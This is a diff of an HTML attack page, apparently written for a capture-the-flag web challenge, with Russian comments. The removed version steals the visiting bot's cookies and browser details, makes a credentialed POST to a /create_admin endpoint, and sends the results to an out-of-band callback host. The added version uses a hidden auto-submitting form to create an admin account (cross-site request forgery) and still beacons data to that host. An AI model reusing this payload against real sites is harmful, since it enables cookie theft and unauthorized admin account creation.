@@ -2,93 +2,44 @@
 <html>
 <body>
 <script>
-// 1. Собираем информацию о боте
+// 1. Информация о боте
 const botInfo = {
-    cookies: document.cookie,
     userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    timestamp: new Date().toISOString(),
     location: window.location.href,
-    referrer: document.referrer
+    timestamp: new Date().toISOString()
 };
 
-// 2. Кодируем информацию
+// 2. Отправляем инфо
 const encodedInfo = btoa(JSON.stringify(botInfo));
+new Image().src = "https://info-" + encodedInfo + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
 
-// 3. Сначала отправляем информацию о боте
-new Image().src = "https://" + encodeURIComponent(encodedInfo) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+// 3. СОЗДАЕМ ФОРМУ (не fetch!)
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = 'https://tasks.goidactf.ru:20246/create_admin';
+form.target = '_blank'; // открыть в новом окне
+form.style.display = 'none';
 
-// 4. Делаем POST запрос через fetch и отправляем ответ на другой subdomain
-fetch('https://tasks.goidactf.ru:20246/create_admin', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Referer': 'https://tasks.goidactf.ru:20246/',
-        'Origin': 'https://tasks.goidactf.ru:20246'
-    },
-    body: 'new_admin_login=ctfadmin_' + Date.now(),
-    credentials: 'include'
-})
-.then(response => {
-    // Получаем статус и текст ответа
-    return Promise.all([
-        response.text(),
-        Promise.resolve({
-            url: response.url,
-            status: response.status,
-            statusText: response.statusText,
-            headers: Object.fromEntries(response.headers.entries())
-        })
-    ]);
-})
-.then(([responseText, responseMeta]) => {
-    // 5. Формируем полный ответ
-    const fullResponse = {
-        botInfo: botInfo,
-        request: {
-            url: 'https://tasks.goidactf.ru:20246/create_admin',
-            method: 'POST'
-        },
-        response: {
-            ...responseMeta,
-            body: responseText
-        },
-        timestamp: new Date().toISOString()
-    };
-    
-    // 6. Кодируем и отправляем на webhook
-    const encodedResponse = btoa(JSON.stringify(fullResponse));
-    
-    // Используем другой subdomain для ответа
-    new Image().src = "https://response-" + encodeURIComponent(encodedResponse) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
-    
-    // Или отправляем через POST запрос
-    const responseForm = document.createElement('form');
-    responseForm.method = 'POST';
-    responseForm.action = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture';
-    responseForm.style.display = 'none';
-    responseForm.enctype = 'text/plain';
-    
-    const textarea = document.createElement('textarea');
-    textarea.name = 'data';
-    textarea.value = JSON.stringify(fullResponse, null, 2);
-    responseForm.appendChild(textarea);
-    
-    document.body.appendChild(responseForm);
-    responseForm.submit();
-})
-.catch(error => {
-    // 7. Отправляем ошибку
-    const errorData = {
-        botInfo: botInfo,
-        error: error.toString(),
-        timestamp: new Date().toISOString()
-    };
-    
-    const encodedError = btoa(JSON.stringify(errorData));
-    new Image().src = "https://error-" + encodeURIComponent(encodedError) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
-});
+// 4. Добавляем поля
+const loginInput = document.createElement('input');
+loginInput.type = 'hidden';
+loginInput.name = 'new_admin_login';
+loginInput.value = 'form_admin_' + Date.now();
+form.appendChild(loginInput);
+
+// 5. Добавляем скрытое поле для результата (если сервер его вернет)
+const resultInput = document.createElement('input');
+resultInput.type = 'hidden';
+resultInput.name = 'result_callback';
+resultInput.value = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture';
+form.appendChild(resultInput);
+
+// 6. Добавляем форму на страницу и отправляем
+document.body.appendChild(form);
+form.submit();
+
+// 7. Сообщаем что форма отправлена
+new Image().src = "https://form-submitted.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
 </script>
 </body>
 </html>
